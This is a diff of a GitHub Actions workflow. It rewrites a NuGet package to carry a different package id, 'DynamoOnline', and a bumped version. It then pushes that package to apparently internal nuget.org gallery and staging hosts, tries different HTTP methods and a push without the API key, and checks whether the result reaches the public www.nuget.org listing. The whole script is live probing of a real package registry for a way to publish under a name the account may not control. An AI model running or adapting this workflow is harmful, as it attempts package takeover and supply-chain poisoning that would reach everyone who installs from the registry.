@@ -33,69 +33,59 @@ jobs:
         with:
           user: ${{ secrets.NUGET_USER }}
       
-      - name: Test different subdomains
+      - name: Probe 500 error endpoints
         run: |
           cd artifacts
           ORIG_PKG=$(ls *.nupkg)
           
-          # Create DynamoOnline package (you own this)
+          # Create DynamoOnline package
           rm -rf tampered && mkdir tampered
           unzip -q -o "$ORIG_PKG" -d tampered
           find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>DynamoOnline</id>|g" {} \;
-          find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>77.0.0</version>|g" {} \;
+          find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>78.0.0</version>|g" {} \;
           cd tampered && zip -q -r ../test.nupkg . && cd ..
           
-          # Test each subdomain
-          ENDPOINTS=(
-            "https://api.nuget.org/v3/package/"
-            "https://api-secondary.nuget.org/v3/package/"
-            "https://api.nuget.org/api/v2/package/"
-            "https://staging.nuget.org/api/v2/package/"
-            "https://preview.nuget.org/api/v2/package/"
-            "https://apippe.nuget.org/api/v2/package/"
-            "https://gallery.nuget.org/api/v2/package/"
-            "https://gallery-usnc.nuget.org/api/v2/package/"
-            "https://gallery-ussc.nuget.org/api/v2/package/"
-            "https://feed.nuget.org/api/v2/package/"
-            "https://packages.nuget.org/api/v2/package/"
-            "https://symbols.nuget.org/api/v2/package/"
-            "https://globalcdn.nuget.org/api/v2/package/"
-          )
+          echo "=== Probe gallery-ussc-ase.nuget.org more ==="
           
-          for endpoint in "${ENDPOINTS[@]}"; do
-            echo "=== Testing: $endpoint ==="
-            curl -s -w "\nHTTP:%{http_code}\n" -X PUT "$endpoint" \
+          # Try different HTTP methods
+          for method in PUT POST GET DELETE; do
+            echo "--- Method: $method ---"
+            curl -s -w "\nHTTP:%{http_code}\n" -X $method "https://gallery-ussc-ase.nuget.org/api/v2/package/" \
               -H "X-NuGet-ApiKey: $NUGET_KEY" \
               -H "X-NuGet-Client-Version: 6.0.0" \
               -H "X-NuGet-Protocol-Version: 4.1.0" \
               -H "Content-Type: application/octet-stream" \
-              --data-binary @test.nupkg --max-time 10 2>/dev/null || echo "TIMEOUT/ERROR"
-            echo ""
+              --data-binary @test.nupkg --max-time 15 2>/dev/null | head -50
           done
           
-          echo "=== Testing staging/internal endpoints ==="
+          echo -e "\n=== Try without API key ==="
+          curl -s -w "\nHTTP:%{http_code}\n" -X PUT "https://gallery-ussc-ase.nuget.org/api/v2/package/" \
+            -H "X-NuGet-Client-Version: 6.0.0" \
+            -H "Content-Type: application/octet-stream" \
+            --data-binary @test.nupkg --max-time 15 2>/dev/null | head -50
           
-          # Staging slots
-          for host in "stagingslot.nuget.org" "stagingslotussc.nuget.org"; do
-            echo "--- $host ---"
-            curl -s -w "\nHTTP:%{http_code}\n" -X PUT "https://$host/api/v2/package/" \
-              -H "X-NuGet-ApiKey: $NUGET_KEY" \
-              -H "X-NuGet-Client-Version: 6.0.0" \
-              -H "X-NuGet-Protocol-Version: 4.1.0" \
-              -H "Content-Type: application/octet-stream" \
-              --data-binary @test.nupkg --max-time 10 2>/dev/null || echo "TIMEOUT/ERROR"
-          done
+          echo -e "\n=== Try with valid package we own ==="
+          curl -s -w "\nHTTP:%{http_code}\n" -X PUT "https://gallery-ussc-ase.nuget.org/api/v2/package/" \
+            -H "X-NuGet-ApiKey: $NUGET_KEY" \
+            -H "X-NuGet-Client-Version: 6.0.0" \
+            -H "X-NuGet-Protocol-Version: 4.1.0" \
+            -H "Content-Type: application/octet-stream" \
+            --data-binary @$ORIG_PKG --max-time 15 2>/dev/null | head -50
           
-          echo -e "\n=== Testing gallery ASE endpoints ==="
-          for host in "gallery-usnc-ase.nuget.org" "gallery-ussc-ase.nuget.org" "gallery-usnc-ase-staging.nuget.org" "gallery-ussc-ase-staging.nuget.org"; do
-            echo "--- $host ---"
-            curl -s -w "\nHTTP:%{http_code}\n" -X PUT "https://$host/api/v2/package/" \
-              -H "X-NuGet-ApiKey: $NUGET_KEY" \
-              -H "X-NuGet-Client-Version: 6.0.0" \
-              -H "X-NuGet-Protocol-Version: 4.1.0" \
-              -H "Content-Type: application/octet-stream" \
-              --data-binary @test.nupkg --max-time 10 2>/dev/null || echo "TIMEOUT/ERROR"
-          done
+          echo -e "\n=== Check other endpoints on gallery-ussc-ase ==="
+          curl -s -w "\nHTTP:%{http_code}\n" "https://gallery-ussc-ase.nuget.org/" --max-time 10 | head -20
+          curl -s -w "\nHTTP:%{http_code}\n" "https://gallery-ussc-ase.nuget.org/api/v2/" --max-time 10 | head -20
+          
+          echo -e "\n=== Try symbolpackage endpoint ==="
+          curl -s -w "\nHTTP:%{http_code}\n" -X PUT "https://gallery-ussc-ase.nuget.org/api/v2/symbolpackage/" \
+            -H "X-NuGet-ApiKey: $NUGET_KEY" \
+            -H "X-NuGet-Client-Version: 6.0.0" \
+            -H "Content-Type: application/octet-stream" \
+            --data-binary @test.nupkg --max-time 15 2>/dev/null | head -50
+          
+          echo -e "\n=== Check if it syncs to main ==="
+          # If we can push here, does it sync to www.nuget.org?
+          curl -s "https://www.nuget.org/packages/DynamoOnline/" | grep -o 'version.*78.0.0' || echo "Version 78.0.0 not found on main"
 
         env:
           NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
